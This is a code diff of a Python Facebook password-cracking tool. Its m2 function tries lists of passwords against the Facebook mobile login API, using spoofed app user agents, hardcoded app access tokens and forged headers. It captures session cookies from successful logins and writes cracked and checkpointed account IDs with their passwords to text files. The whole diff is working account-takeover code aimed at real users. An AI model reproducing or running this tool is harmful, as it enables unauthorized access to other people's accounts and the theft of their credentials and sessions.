@@ -995,21 +995,18 @@ def m1(idf,pwv):
 	except Exception as e:
 		pass
 def m2(idf,pwv):
+	global loop,oks
 	try:
-		global ok,loop,sim_id
-		animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-		sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-		sys.stdout.flush()
 		for pas in pwv:
-				tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|216a8ca8adfa721bd1e84171d5abad204b082890']
-				access_token = random.choice(tokenlist)
-				fbcr = sim_id
-				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/340.0.0.28.116;FBBV/395831493;FBDM/{density=3.0,width=1080,height=2248};FBLC/en_US;FBRV/472950281;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970;FBSV/12;FBCA/armeabi-v7a:armeabi;]"
-				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
-				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()).upper(),'email':idf,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()).upper(),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':access_token}
-				po = requests.post('https://b-api.facebook.com/auth/login', data=data, headers=head).json()
-				if 'session_key' in po:
+			session = requests.Session()
+			animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+			sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+			sys.stdout.flush()
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme; FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()).upper(),'email':idf,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()).upper(),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':access_token}
+			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
+			po = session.post('https://b-api.facebook.com/auth/login', data=data, headers=head).json()
+			if 'session_key' in po:
 					uid = str(po['uid'])
 					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1026,7 +1023,7 @@ def m2(idf,pwv):
 						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
 						file_path = os.path.join(folder_path, 'LOCK-IDS.txt')
 						break
-				elif 'www.facebook.com' in po['error']['message']:
+			elif 'www.facebook.com' in po['error']['message']:
 					uid = str(po['error']['error_data']['uid'])
 					print('\r\033[1;91m [DARK-CP] '+uid+' | '+pas+'\033[1;97m')
 					file_path = os.path.join(folder_path, 'DARK-CP.txt')
@@ -1034,15 +1031,13 @@ def m2(idf,pwv):
 						file.write(uid+'|'+pas+'\n')
 					cps.append(uid)
 					break
-				else:
-					continue
+			else:
+				continue
 		loop+=1
 	except requests.exceptions.ConnectionError:
 		time.sleep(20)
 	except Exception as e:
 		pass
-
-
 
 def m3(idf,pwv):
   global loop,ok,cp
